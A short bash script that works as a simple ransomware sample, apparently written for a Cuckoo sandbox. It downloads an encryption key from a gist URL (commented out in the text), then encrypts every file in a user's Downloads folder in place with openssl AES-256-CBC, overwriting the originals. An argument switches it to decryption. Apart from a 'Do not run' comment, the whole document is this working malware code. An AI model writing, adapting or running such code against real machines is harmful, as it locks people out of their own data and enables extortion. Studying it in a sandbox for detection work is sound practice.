#!/bin/bash

# Do not run the script!
# URL="https://gist.githubusercontent.com/tazlauanubianca/d68251f55816850ed11d742fcfb30355/raw/9d0db33111d62a1fea30b0f8e2057ffd23cca2b5/key"

wget $URL
KEY=$(cat key | tr -d '\n')
if [ "$#" -ne 1 ]; then
	# encode
	args=""
else
	# decode
	args="-d"
fi

for f in $(find '/home/cuckoo/Downloads' -type f); do
	openssl aes-256-cbc $args -k $KEY -in $f -out $f.enc
	mv -f $f.enc $f
done

